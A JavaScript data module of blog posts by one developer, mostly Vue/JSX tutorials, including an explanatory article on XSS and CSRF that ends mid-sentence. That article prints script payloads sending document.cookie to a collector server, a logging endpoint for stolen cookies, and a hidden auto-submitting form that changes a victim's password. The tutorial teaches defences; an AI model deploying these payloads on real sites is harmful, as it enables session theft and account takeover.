export const articleData = {
  code: 200,
  pageSize: 100,
  nowPage: 1,
  lastPage: 1,
  count: 86,
  rows: [
    {
      id: 86,
      title: '苟且偷生',
      is_comment: 1,
      status: 1,
      img: '/1638093406012author.jpg',
      content: '2021年到底了还是没有惊喜，看来今年又是操蛋的一年呢',
      click: 8,
      createdAt: '2021-11-28T09:56:46.000Z',
      updatedAt: '2021-11-28T09:56:46.000Z',
      types: [
        {
          id: 3,
          name: '随记',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 86,
            article_id: 86,
            type_id: 3,
            createdAt: '2021-11-28T09:56:46.000Z',
            updatedAt: '2021-11-28T09:56:46.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 86,
            user_id: 1,
            article_id: 86,
            createdAt: '2021-11-28T09:56:46.000Z',
            updatedAt: '2021-11-28T09:56:46.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 26,
          name: '生活琐事',
          color: '#44d62c',
          createdAt: '2021-04-18T11:02:30.000Z',
          updatedAt: '2021-04-18T11:02:30.000Z',
        },
      ],
    },
    {
      id: 85,
      title: 'vue使用jsx搭建组件库',
      is_comment: 1,
      status: 1,
      img: '/1623599603371皮卡丘.jpeg',
      content:
        '# 项目地址\n\n现在这篇文章只是一个使用方式，具体代码请前往：https://github.com/galaxy-s10/hss-ui-cpt，当然不能直接cv整个components过来用，因为里面依赖了一些插件，比如：less，vue-fragment，normalize.css暂时就依赖了这三个插件。\n\n# Modal\n\n## 使用\n\n```vue\n<template>\n  <div>\n    <hss-modal\n      v-model="visible"\n      title="tip"\n      cancelText="no"\n      confirmText="ok"\n      :mask="true"\n      :maskClosable="true"\n      @on-cancel="cancelClick"\n      @on-confirm="confirmClick"\n      @on-close="closeClick"\n      @visible-change="visibleChange"\n    >\n      <!-- <div slot="foot" slot-scope="aaa">\n        <span>自定义foot</span>\n      </div> -->\n      hello world\n    </hss-modal>\n\n    <span @click="changeModal">点击显示modal</span>\n  </div>\n</template>\n\n<script>\nimport HssModal from "./components/hss-ui-cpt/modal/index";\n\nexport default {\n  components: {\n    HssModal,\n  },\n  data() {\n    return {\n      visible: false,\n    };\n  },\n  computed: {},\n  created() {},\n  mounted() {},\n  methods: {\n    changeModal() {\n      this.visible = true;\n    },\n    visibleChange(v) {\n      console.log("visibleChange", v);\n    },\n    cancelClick() {\n      console.log("cancelClick,app组件里modal的cancel回调");\n    },\n    confirmClick() {\n      console.log("cancelClick,app组件里modal的confirm回调");\n    },\n    closeClick() {\n      console.log("closeClick,app组件里modal的close回调");\n    },\n  },\n};\n</script>\n\n```\n\n## API\n\n| 参数         | 说明                                          | 类型    | 默认值 |\n| ------------ | --------------------------------------------- | ------- | ------ |\n| visible      | 是否显示对话框，可使用 v-model 双向绑定数据。 | Boolean | false  |\n| title        | 对话框标题                                    | String  | 标题   |\n| cancelText   | 取消按钮文字                                  | String  | 取消   |\n| confirmText  | 确定按钮文字                                  | String  | 确定   |\n| mask         | 是否显示遮罩层                                | Boolean | true   |\n| maskClosable | 点击遮罩层是否关闭对话框                      | Boolean | true   |\n\n## 事件\n\n| 参数           | 说明                   | 返回值     |\n| -------------- | ---------------------- | ---------- |\n| on-cancel      | 点击取消按钮回调       | 无         |\n| on-confirm     | 点击确认按钮回调       | 无         |\n| on-close       | 点击右上角关闭按钮回调 | 无         |\n| visible-change | 显示状态发生变化时触发 | true/false |\n\n## 插槽\n\n| 名称 | 说明           |\n| ---- | -------------- |\n| foot | 自定义页脚内容 |\n\n# Switch\n\n## 使用\n\n```vue\n    <hss-switch\n      v-model="switchVal"\n      openText="开"\n      closeText="关"\n      :defaultChecked="true"\n      @clickSwitch="clickSwitch"\n      @changeSwitch="changeSwitch"\n    >\n      <template slot="openSlot">\n        <b>开启</b>\n      </template>\n      <span slot="closeSlot">关闭</span>\n    </hss-switch>\n```\n\n\n\n## API\n\n| 参数           | 说明                                            | 类型    | 默认值 |\n| -------------- | ----------------------------------------------- | ------- | ------ |\n| switchVal      | 指定当前是否选中，可使用 v-model 双向绑定数据。 | Boolean | false  |\n| openText       | 选中时的内容                                    | String  |        |\n| closeText      | 非选中时的内容                                  | String  |        |\n| defaultChecked | 初始是否选中                                    | String  | false  |\n\n## 事件\n\n| 参数         | 说明                                        | 返回值                                  |\n| ------------ | ------------------------------------------- | --------------------------------------- |\n| clickSwitch  | 点击时回调函数，此时的switchVal是点击时的   | function(switchVal:Boolean,event:Event) |\n| changeSwitch | 状态改变时回调函数，此时的switchVal是最新的 | function(switchVal:Boolean)             |\n\n## 插槽\n\n| 名称      | 说明           |\n| --------- | -------------- |\n| openSlot  | 选中时的插槽   |\n| closeSlot | 非选中时的插槽 |\n\n# Button\n\n# Message\n\n# Icon',
      click: 175,
      createdAt: '2021-06-13T15:53:24.000Z',
      updatedAt: '2021-06-13T15:59:14.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 85,
            article_id: 85,
            type_id: 1,
            createdAt: '2021-06-13T15:53:24.000Z',
            updatedAt: '2021-06-13T15:53:24.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 85,
            user_id: 1,
            article_id: 85,
            createdAt: '2021-06-13T15:53:24.000Z',
            updatedAt: '2021-06-13T15:53:24.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
        {
          id: 5,
          name: 'vue',
          color: 'rgba(65, 184, 131, 1)',
          createdAt: '2020-07-04T15:19:33.000Z',
          updatedAt: '2020-07-04T15:19:33.000Z',
        },
        {
          id: 20,
          name: '造轮子',
          color: 'rgba(151, 239, 19, 1)',
          createdAt: '2020-08-13T15:01:02.000Z',
          updatedAt: '2020-08-13T15:01:02.000Z',
        },
      ],
    },
    {
      id: 84,
      title: 'vue之jsx',
      is_comment: 1,
      status: 1,
      img: '/1623259204948jsx-1.png',
      content:
        '# jsx\n\n> vue使用render+jsx代替template！\n\n## 使用jsx替换template\n\n请将下面的template转换成render+jsx的形式：\n\n```vue\n// layoutCpt\n<template>\n  <div class="wrap">\n    <slot></slot>\n  </div>\n</template>\n```\n\n请将下面的template转换成render+jsx的形式：\n\n```vue\n// layoutCpt\n<template>\n  <div class="wrap">\n    <slot name="content"></slot>\n  </div>\n</template>\n```\n\n请将下面的template转换成render+jsx的形式：\n\n```vue\n// layoutCpt\n<template>\n  <div class="wrap">\n    <slot>默认slot</slot>\n  </div>\n</template>\n```\n\n请将下面的template转换成render+jsx的形式：\n\n```vue\n// layoutCpt\n<template>\n  <div class="wrap">\n    <slot name="content">默认content</slot>\n  </div>\n</template>\n```\n\n请将下面的template转换成render+jsx的形式：\n\n```vue\n// layoutCpt\n<template>\n  <div class="wrap">\n    <slot name="content" v-bind="info">默认content</slot>\n  </div>\n</template>\n\n<script>\nexport default {\n  components: {},\n  data() {\n    return {\n      info: {\n        name: "hss",\n        age: 22,\n        sex: "man",\n        hobby: ["code", "game"],\n      },\n    };\n  },\n  computed: {},\n  created() {},\n  mounted() {},\n  methods: {},\n};\n</script>\n\n```\n\n\n\n## 使用jsx替换slot\n\n请将下面的template转换成render+jsx的形式：\n\n```vue\n<template>\n  <div>\n    <layout-cpt>\n      我是layoutCpt组件\n    </layout-cpt>\n  </div>\n</template>\n\n<script>\nimport layoutCpt from "./components/layoutCpt.vue";\nexport default {\n  components: {\n    layoutCpt,\n  },\n  data() {\n    return {};\n  }\n};\n</script>\n```\n\n请将下面的template转换成render+jsx的形式：\n\n```vue\n<template>\n  <div>\n    <layout-cpt>\n      <div slot="content">hello world!</div>\n    </layout-cpt>\n  </div>\n</template>\n\n<script>\nimport layoutCpt from "./components/layoutCpt.vue";\nexport default {\n  components: {\n    layoutCpt,\n  },\n  data() {\n    return {};\n  }\n};\n</script>\n```\n\n请将下面的template转换成render+jsx的形式：\n\n```vue\n<template>\n  <div>\n    <layout-cpt>\n      <div slot="content" slot-scope="hhh">hello world!{{hhh}}</div>\n    </layout-cpt>\n  </div>\n</template>\n\n<script>\nimport layoutCpt from "./components/layoutCpt.vue";\nexport default {\n  components: {\n    layoutCpt,\n  },\n  data() {\n    return {};\n  }\n};\n</script>\n```\n\n## 综合性案例\n\n待更新！\n\n# 插槽\n\n## 具名插槽\n\n> this.$slots\n\n- **类型**：`{ [name: string]: ?Array<VNode> }`\n- **只读**\n- **响应性**：否\n\n可以通过 [`this.$slots`](https://cn.vuejs.org/v2/api/#vm-slots) 访问静态插槽的内容，每个插槽都是一个 VNode 数组：\n\n所以，this.$slots拿到的是VNode数组\n\n```jsx\n<div>\n    {this.$slots.default}\n    {/* this.$slots.abc是一个VNode数组，如果父组件没用使用这个abc插槽，就会使用默认的abc插槽内容 */}\n    {this.$slots.abc || <div>abc具名插槽默认值</div>}\n    {this.$slots.nba || <div>nba具名插槽默认值</div>}\n    {this.$slots.cba || <div>cba具名插槽默认值</div>}\n</div>\n```\n\n\n\n## 作用域插槽\n\n> this.$scopedSlots\n\n- **类型**：`{ [name: string]: props => Array<VNode> | undefined }`\n\n- **只读**\n\n- **详细**：\n\n  用来访问[作用域插槽](https://cn.vuejs.org/v2/guide/components-slots.html#作用域插槽)。对于包括 `默认 slot` 在内的每一个插槽，该对象都包含一个返回相应 VNode数组或者undefined的函数。\n\n从this.$scopedSlots的类型看，它是一个对象，这个对象的键名是字符串，值是一个函数，而且这个函数返回VNode数组或者undefined\n\n即this.$scopedSlots.xxx，xxx是一个函数，调用这个函数，会返回VNode数组或者undefined。\n\n1. 如果父组件调用该组件的时候，使用了xxx插槽，那么该组件里面调用this.$scopedSlots.xxx就会得到一个VNode函数；\n2. 如果父组件调用该组件的时候，没有使用了xxx插槽，那么该组件里面调用this.$scopedSlots.xxx就会得到undefined。\n\n```jsx\n<div>\n    {this.$scopedSlots}\n    {this.$scopedSlots}\n    {this.$scopedSlots}\n</div>\n```\n\n## 补充\n\n### slot自从2.6.0后就废弃了！\n\n```jsx\n// 下面的slot是具名插槽,因为他在layout-cpt组件内部\n<template>\n\t<div>\n    <layout-cpt>\n      <div class="hss-aside" slot="customAside">aside</div>\n    </layout-cpt>\n  </div>\n</template>\n\n// 下面的写法，slot就是一个自定义属性而已，因为它外层没有组件\n<template>\n\t<div>\n    <div class="hss-aside" slot="customAside">aside</div>\n  </div>\n</template>\n```\n\n\n\n```jsx\n// \'v-slot\' directive must be owned by a custom element\n// v-slot指令必须在自定义元素上使用，即只能在组件上使用v-slot\n<div class="hss-aside" v-slot="customAside">aside</div>\n```\n\n​\t\n\n```jsx\n// slot-scoped需要用在组件内部，在非组件内部使用slot上使用不生效，而且会导致这个customAside插槽不渲染\n<div style="display: flex">\n  <div class="hss-article">article</div> \n  <slot class="hss-aside" name="customAside" slot-scope="info">aside{{info}}</slot>\n</div>\n```\n\n\n\n### slot-scoped\n\n\n\n# 指令\n\n## \n\n# 事件\n\n## 事件修饰符\n\n\n\n# 持续更新！\n\n# 参考\n\nhttps://github.com/vuejs/jsx\n\nhttps://github.com/vuejs/babel-plugin-transform-vue-jsx\n\nhttps://github.com/Thunberg087/vue-fragment\n\nhttps://github.com/vuejs/rfcs/blob/master/active-rfcs/0001-new-slot-syntax.md',
      click: 130,
      createdAt: '2021-06-09T17:20:05.000Z',
      updatedAt: '2021-06-09T17:20:05.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 84,
            article_id: 84,
            type_id: 1,
            createdAt: '2021-06-09T17:20:05.000Z',
            updatedAt: '2021-06-09T17:20:05.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 84,
            user_id: 1,
            article_id: 84,
            createdAt: '2021-06-09T17:20:05.000Z',
            updatedAt: '2021-06-09T17:20:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 5,
          name: 'vue',
          color: 'rgba(65, 184, 131, 1)',
          createdAt: '2020-07-04T15:19:33.000Z',
          updatedAt: '2020-07-04T15:19:33.000Z',
        },
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 83,
      title: 'web常见安全问题',
      is_comment: 1,
      status: 1,
      img: '/1622030081250web安全.png',
      content:
        '# Xss攻击\n\nXss（cross site scripting）跨站脚本攻击，为了和css区分，所以缩写是xss。\n\n> XSS是注入攻击的一种，攻击者通过将代码注入被攻击者的网站中，用户一旦访问访问网页便会执行被注入的恶意脚本。\n\n## XSS原理\n\nxss攻击个人认为主要出现在服务端渲染，因为如果是客户端渲染，客户端渲染的话一般都会对输入的内容转义，所以服务端渲染基本碰不到存在xss漏洞的网站，\n\n如果是服务端渲染，那就不一样了，因为如果我前端在输入框里输入的不是普通字符串，而是输入了一串js代码，或者有些网站是会根据地址栏上的参数进行渲染，我url上面的参数值没有写普通字符串，而是直接写js语句，如果后端没做处理，就将前端的js代码渲染在了html上面，最终访问网站，后端就会返回如下的html页面：\n\n```html\n<div>\n    <h1>留言板</h1>\n    <ul>\n        <li>\n            你好啊\n        </li>\n        <li>\n            <img src="不存在的地址1" onerror="window.location.href=\'http://www.github.com\';" alt="">\n        </li>\n        <li>\n            <script>window.location.href = "http://localhost:3000/js_xss?" + document.cookie;</script>\n        </li>\n        <li>\n            <script>\n                var imgEl = new Image();\n                imgEl.src = "http://localhost:3000/img_xss?" + document.cookie;\n                imgEl.style.display = \'none\';\n                document.body.appendChild(imgEl);\n            </script>\n        </li>\n        <li>\n            <script>\n                var scriptEl = document.createElement("script");\n                scriptEl.type = "text/javascript";\n                scriptEl.src = "http://localhost:3000/js_xss?" + document.cookie;\n                document.body.appendChild(scriptEl);\n            </script>\n        </li>\n    </ul>\n</div>\n```\n\n当浏览器解析到这些可执行语句的时候，就会执行，后果可想而知。\n\n## 类型\n\n### 反射型（非持久型）\n\n一般会通过URL注入攻击脚本，只有当用户访问这个URL是才会执行攻击脚本。\n\n### 存储型（持久型）\n\n恶意代码被保存到目标网站的服务器中，比如用户留言的时候输入了一串js代码，然后发表留言的时候，这串js代码会保存到数据库，等下次再访问该网站的时候，网站会获取留言列表，如果你的那条恶意代码的留言显示在了页面上，就会执行你的那串恶意代码。这样的危害非常大，只要是访问该网站的都有可能受到影响。\n\n## 防范\n\n### HTML转义\n\n防范XSS攻击最主要的方法是对用户输入的内容进行HTML转义，转义后可以确保用户输入的内容在浏览器中作为文本显示，而不是作为代码解析。\n\n### 验证用户输入\n\nXSS攻击可以在任何用户可定制内容的地方进行，如下：\n\n```html\n<a href=”{{url}}”>Website</a>\n```\n\n其中{{url}}部分表示会被替换为用户输入的url变量值。如果不对URL进行验证，那么用户就可以写入javaScript代码，比如javascript:alert(\'Bingo!\');。因为这个值并不包含会被转义的<和>。最终页面上的连接代码会变为：\n\n```html\n<a href="javascript:alert(\'Bingo!\');">Website</a>\n```\n\n当用户单击这个链接时，浏览器就会执行被href属性中设置的攻击代码。\n\n另外，程序还允许用户设置头像图片的URL。这个图片通过下面的方式显示：\n\n```html\n<img src="{{url}}">\n```\n\n类似的，{{url}}部分表示会被替换为用户输入的url变量值。如果不对输入的URL进行验证，那么用户可以将url设为"xxx" onerror="alert(\'Bingo!\')"，最终的img标签就会变为：\n\n```html\n<img src="xxx" onerror="alert(\'Bingo!\')">\n```\n\n在这里因为src中传入了一个错误的URL，浏览器变回执行onerror属性中设置的javaScript代码。\n\n> 可以使用功能单引号或者双引号，将用户的输入转成字符串，再渲染到html上。\n\n### 设置cookie的HTTPOnly属性\n\nJavaScript [`Document.cookie`](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie) API 无法访问带有 `HttpOnly` 属性的cookie；此类 Cookie 仅作用于服务器。例如，持久化服务器端会话的 Cookie 不需要对 JavaScript 可用，而应具有 `HttpOnly` 属性。此预防措施有助于缓解[跨站点脚本（XSS）](https://wiki.developer.mozilla.org/zh-CN/docs/Web/Security/Types_of_attacks#Cross-site_scripting_(XSS))攻击。\n\n# Csrf攻击\n\nCSRF（Cross-site request forgery）跨站请求伪造\n\n> 简单来讲就是攻击者（黑客，钓鱼网站）盗用了你的身份，以你的名义发送恶意请求，这些请求包括发送邮件、发送消息、盗取账号、购买商品、银行转账\n\n## Csrf原理\n\n个人认为，Csrf攻击的原理就是利用了发起请求时，浏览器会自动带上一些存在客户端的值，比如cookie。众所周知，http协议是无状态的，在那个古老的年代，很多网站都将用户登录成功时候返回的登录状态（如token）存进cookie里，然后客户端发起请求时，啥都不用干，照常发请求，因为发请求时，浏览器会自动带上cookie，后端在接收到请求时，就会判断cookie是否合法或者过期等等，如果判断无误，就会返回用户操作结果。从上面的流程可以看出，所有的操作都是根据cookie的，即后端收到请求，谁都不认，就认cookie，cookie对就返回结果，因此，就衍生出了Csrf攻击，最最低级的Csrf攻击就是所谓的钓鱼网站，什么是钓鱼网站？首先要完成Csrf攻击，首先要满足以下条件：\n\n1. 该网站存在Csrf漏洞（重要条件）\n2. 浏览器没有做安全限制（重要条件）\n3. 该用户防范意识不足（次要条件）\n\n当满足了上面的一二点后，那么其实用户被钓鱼的记录就大大提高了，因为大部分人都不会想到，点一下链接，自己的数据就被篡改了。\n\n用通俗案例模拟整体流程：\n\n1. 某公司开发了一个网站，该网站有新人活动，新人注册登录即可直接返十块钱红包（即白嫖），但该网站存在Csrf漏洞。\n\n   该网站的前端：最终部署在：https://www.zhengbeining.com/csrf/下\n\n   ```vue\n   <template>\n     <div>\n       <h1 style="color: red">Csrf测试网站</h1>\n       <h1>当前用户信息:{{ info }}</h1>\n       <div style="width: 500px" v-if="!loginOk">\n         <el-form ref="form" :model="info" label-width="80px">\n           <el-form-item label="账号">\n             <el-input v-model="info.username"></el-input>\n           </el-form-item>\n           <el-form-item label="密码">\n             <el-input type="password" v-model="info.password"></el-input>\n           </el-form-item>\n           <el-form-item label="">\n             <el-button type="success" @click="login">登录</el-button>\n             <el-button type="primary" @click="register">注册</el-button>\n           </el-form-item>\n         </el-form>\n       </div>\n       <div v-else>\n         <h2>登录成功</h2>\n         <div style="width: 500px">\n           新密码：<el-input type="password" v-model="newpassword"></el-input>\n           <el-button type="danger" @click="edit">修改</el-button>\n         </div>\n       </div>\n     </div>\n   </template>\n   \n   \n   \n   <script>\n   import Cookies from "js-cookie";\n   import axios from "axios";\n   export default {\n     components: {},\n     data() {\n       return {\n         info: {\n           username: "",\n           password: "",\n         },\n         newpassword: "",\n         loginOk: false,\n       };\n     },\n     mounted() {\n       this.loginOk = Cookies.get("token");\n       if (this.loginOk) {\n         console.log("cookie有token,获取用户信息");\n         this.getUserInfo();\n       } else {\n         console.log("cookie没有token");\n       }\n     },\n     methods: {\n       getUserInfo() {\n         axios\n           // .get("/api/getUserInfo", {\n           .get("https://www.zhengbeining.com/csrf/getUserInfo", {\n             params: { token: Cookies.get("token") },\n           })\n           .then((res) => {\n             console.log(res);\n             if (res.data.code == 200) {\n               delete res.data.info.token;\n               this.info = Object.assign({}, this.info, res.data.info);\n               this.loginOk = true;\n               this.$message.success(res.data.msg);\n             } else {\n               this.loginOk = false;\n               Cookies.remove("token");\n               this.$message.error(res.data.msg);\n             }\n           })\n           .catch((err) => {\n             console.log(err);\n           });\n       },\n       login() {\n         axios\n           // .post("/api/login", {\n           .post("https://www.zhengbeining.com/csrf/login", {\n             ...this.info,\n           })\n           .then((res) => {\n             if (res.data.code == 200) {\n               this.$message.success(res.data.msg);\n               Cookies.set("token", res.data.info.token);\n               delete res.data.info.token;\n               this.info = Object.assign({}, this.info, res.data.info);\n               this.loginOk = true;\n             } else {\n               this.$message.error(res.data.msg);\n             }\n           })\n           .catch((err) => {\n             console.log(err);\n           });\n       },\n       register() {\n         axios\n           // .post("/api/register", {\n           .post("https://www.zhengbeining.com/csrf/register", {\n             ...this.info,\n           })\n           .then((res) => {\n             if (res.data.code == 200) {\n               this.$message.success(res.data.msg);\n               // this.info = Object.assign({}, this.info, res.data.info);\n               // Cookies.set("token", res.data.token);\n               // this.loginOk = true;\n             } else {\n               this.$message.error(res.data.msg);\n             }\n           })\n           .catch((err) => {\n             console.log(err);\n           });\n       },\n       edit() {\n         if (this.newpassword.length < 6) {\n           this.$message.error("密码需要大于6位数");\n           return;\n         }\n         axios\n           // .post("/api/edit", {\n           .post("https://www.zhengbeining.com/csrf/edit", {\n             password: this.newpassword,\n           })\n           .then((res) => {\n             if (res.data.code == 200) {\n               Cookies.remove("token");\n               // this.$data = this.$options.data();\n               Object.assign(this.$data, this.$options.data());\n               this.$message.success(res.data.msg);\n             } else {\n               this.$message.error(res.data.msg);\n             }\n           })\n           .catch((err) => {\n             console.log(err);\n           });\n       },\n     },\n   };\n   </script>\n   \n   <style>\n   </style>\n   ```\n\n   该网站的后端：最终还是部署在https://www.zhengbeining.com/csrf/下。\n\n   ```js\n   let express = require(\'express\')\n   const { v4: uuidv4 } = require(\'uuid\');\n   const connection = require(\'./app/database\');\n   \n   // 解析post请求的body数据\n   let app = express()\n   app.use(express.json())\n   app.use(express.urlencoded({ extended: false }))\n   \n   \n   app.all("*", function (req, res, next) {\n     //设置允许跨域的域名，*代表允许任意域名跨域\n     res.header("Access-Control-Allow-Origin", "*");\n     //允许的header类型\n     res.header("Access-Control-Allow-Headers", "Content-Type,authorization,request-origin");\n     //跨域允许的请求方式 \n     res.header("Access-Control-Allow-Methods", "DELETE,PUT,POST,GET,OPTIONS");\n     if (req.method.toLowerCase() == \'options\')\n       res.send(200);  //让options尝试请求快速结束\n     else\n       next();\n   })\n   \n   // 静态文件目录\n   app.use(express.static(\'public\'))\n   var router = express.Router()\n   \n   // Xss攻击，获取cookie\n   app.use(\'/\', router.get(\'/img_xss\', async (req, res, next) => {\n     console.log(\'img_xss攻击成功,拿到cookie：\', req.query)\n     res.end(\'img_xss-ok\')\n   }))\n   \n   // Xss攻击，获取cookie\n   app.use(\'/\', router.get(\'/js_xss\', async (req, res, next) => {\n     console.log(\'js_xss攻击成功,拿到cookie：\', req.query)\n     res.end(\'js_xss-ok\')\n   }))\n   \n   // 获取用户信息\n   app.use(\'/\', router.get(\'/getUserInfo\', async (req, res, next) => {\n     console.log(\'login\')\n     let statement = `SELECT * FROM user WHERE token = ?`;\n     let [result] = await connection.execute(statement, [req.query.token]);\n     if (result[0]) {\n       res.json({ code: 200, msg: \'获取用户信息成功\', info: result[0] })\n     } else {\n       res.json({ code: 400, msg: \'token错误，获取用户信息失败\' })\n     }\n   \n   }))\n   \n   // 注册\n   app.use(router.post(\'/register\', async (req, res, next) => {\n     console.log(\'register\')\n     const { username, password } = req.body;\n     let statement = `SELECT * FROM user WHERE username = ?;`;\n     let [result] = await connection.execute(statement, [username]);\n     if (!result[0]) {\n       let statement = `INSERT INTO user (username, password , token, createdTime) VALUES (?, ?, ?, ?);`;\n       await connection.execute(statement, [username, password, null, new Date() + \'\']);\n       res.json({ code: 200, msg: \'注册成功\' })\n     } else {\n       res.json({ code: 400, msg: \'用户名:\' + username + \',已经被注册了\' })\n     }\n   }))\n   \n   // 登录\n   app.use(\'/\', router.post(\'/login\', async (req, res, next) => {\n     console.log(\'login\')\n     let { username, password } = req.body\n     let statement = `SELECT * FROM user WHERE username = ? and password = ?`;\n     let [result] = await connection.execute(statement, [username, password]);\n     if (!result[0]) {\n       res.json({ code: 400, msg: \'用户名密码错误\' })\n     } else {\n       let statement = `UPDATE user SET token = ? WHERE id = ?;`;\n       await connection.execute(statement, [uuidv4(), result[0].id]);\n       let info = await connection.execute(`SELECT * FROM user WHERE id = ${result[0].id}`);\n       res.json({ code: 200, msg: \'登录成功\', info: info[0][0] })\n     }\n   }))\n   \n   // 修改密码\n   app.use(\'/\', router.post(\'/edit\', async (req, res, next) => {\n     console.log(\'edit\')\n     var Cookies = {};\n     if (req.headers.cookie != null) {\n       req.headers.cookie.split(\';\').forEach(l => {\n         var parts = l.split(\'=\');\n         Cookies[parts[0].trim()] = (parts[1] || \'\').trim();\n       });\n     }\n     let info = await connection.execute(`SELECT * FROM user WHERE token = ?`, [Cookies.token]);\n     // console.log(info[0][0].id)\n     let statement = `UPDATE user SET password =  ? WHERE token = ?;`;\n     let [result] = await connection.execute(statement, [req.body.password, Cookies.token]);\n     console.log(result)\n     if (result.affectedRows == 0) {\n       res.json({ code: 400, msg: \'token错误，修改密码失败\' })\n     } else {\n       let statement = `UPDATE user SET token = ? , updatedTime = ? WHERE id = ?;`;\n       await connection.execute(statement, [uuidv4(), new Date() + \'\', info[0][0].id]);\n       res.json({ code: 200, msg: \'修改密码成功\' })\n     }\n   }))\n   \n   \n   app.listen(\'7000\', function () {\n     console.log(\'http://localhost:7000\', \'running....\')\n   })\n   ```\n\n2. 某骗子知道该网站漏洞后，在网上大肆宣传该网站新人返利活动，然后让用户添加自己的微信以获取更多白嫖福利。\n\n3. 用户a添加了骗子，骗子让他注册登录后，截登录成功的图发给骗子，然后骗子再告诉用户下一步怎么做。\n\n4. 用户a注册登录了（即发起过https://www.zhengbeining.com/csrf/login请求了，然后将token设置在https://www.zhengbeining.com这个域名下的cookie里），截图发给了骗子，这样骗子就确定了改用户登录了，登录信息肯定保存在cookie了，然后骗子因为在这个网站里面修改过密码，知道这个网站修改用户密码是发起一个post请求，带上password这个参数就可以了，后端服务端会判断cookie，并且只认cookie，cookie合法就使用传过来的password改掉数据库的密码，如果cookie不合法，就返回错误。\n\n5. 这时候骗子开始操作了，发了一个链接给用户a，让用户a点击这个链接看看活动规则，但是这个是钓鱼链接，具体代码如下：\n\n   ```html\n   <!DOCTYPE html>\n   <html lang="en">\n   \n   <head>\n       <meta charset="UTF-8">\n       <meta http-equiv="X-UA-Compatible" content="IE=edge">\n       <meta name="viewport" content="width=device-width, initial-scale=1.0">\n       <title>Document</title>\n   </head>\n   \n   <body>\n       <form class="csrf" action="http://localhost:3000/edit" method="post" target="iframe" style="display: none;">\n           <input type="text" name="password" value="999" />\n       </form>\n       <iframe name="iframe" style="display: none;"></iframe>\n   \n       <script>\n           var el = document.getElementsByClassName("csrf")[0]\n           el.submit()\n       </script>\n   </body>\n   \n   </html>\n   ```\n\n   这个链接打开其实是一片空白，它却会发起了一个表单请求，发起了一个post请求：http://localhost:3000/edit，并且将password的值设为了999，然后submit提交，而且提交是弹出一个iframe嵌套窗口，但是这个窗口设置了隐藏样式，就感觉啥都看不出来，就是一片空白。\n\n   \n\n6. 用户a点击链接后，虽然一片空白，但是却背地里发起了一个post请求，而且由于用户登录成功了，token保存在cookie里了，现在再次发起的请求https://www.zhengbeining.com/edit还是https://www.zhengbeining.com的，于是，只要是同一个浏览器，用户之前在这里登录过了，留下了cookie，且这个cookie还没过期（一般cookie不会这么快过期，而且用户也是刚登录完不久就点击了骗子链接），再次发起https://www.zhengbeining.com/edit的时候，不管当前的骗子链接是怎样的，浏览器都会发起http://localhost:3000/edit请求，并且，浏览器会找自己有没有存在https://www.zhengbeining.com这个域名下的数据，比如：cookie，如果有的话就会带上，而恰巧，之前https://www.zhengbeining.com/login登陆成功的时候就保存了token在cookie里，因此，浏览器会带上这个cookie(即token)传给后端。\n\n## 防范\n\n### Cookie Hashing\n\n应该是最简单的解决方案了，因为虽然发起http请求会带上浏览器同域下的cookie，但是，是发起请求才会自动带上同域的cookie，怎么理解，简单举个例子，比如我浏览器打开了aaa.com和bbb.com两个网页，我在aaa.com发起了一个bbb.com/login的请求，因为浏览器的原因，会自动带上bbb里面的cookie，但是，并不意味这我在aaa.com可以拿到bbb.com的cookie，只是在aaa.com发起bbb的请求的时候，会带上bbb.com下的cookie而已，所以，**为了预防csrf攻击，可以在发起请求的时候，带上一个根据cookie构造出来的hash值：**\n\n这是bbb网站的表单代码\n\n```vue\n<form method=”POST” action=”bbb.com/login”>\n\t<input type=”text” name=”toBankId”>\n\t<input type=”text” name=”money”>\n\t<input type=”hidden” name=”hash” value=”{{hashcookie}}”>\n\t<input type=”submit” name=”submit” value=”Submit”>\n</form>\n```\n\n这样的话，在bbb发起请求，bbb可以访问自己域名下面的cookie，因此发起请求后，后端可以接收到表单里面的hash值，但是，如果是别人aaa.com里面发起的bbb/login请求的话，虽然aaa.com可以构造表达里面的其他参数，但是无法拿到bbb的cookie，所以就不可能根据cookie构造出hash值！后端就可以根据这一点，再通过hash值解密，判断前端传过来的hash是否合法。\n\n### 后端验证HTTP的Referer 和Origin字段\n\n- referer属性\n\n记录了该http请求的来源地址，但有些场景不适合将来源URL暴露给服务器，所以可以设置不用上传，并且referer属性是可以修改的，所以在服务器端校验referer属性并没有那么可靠\n\n- 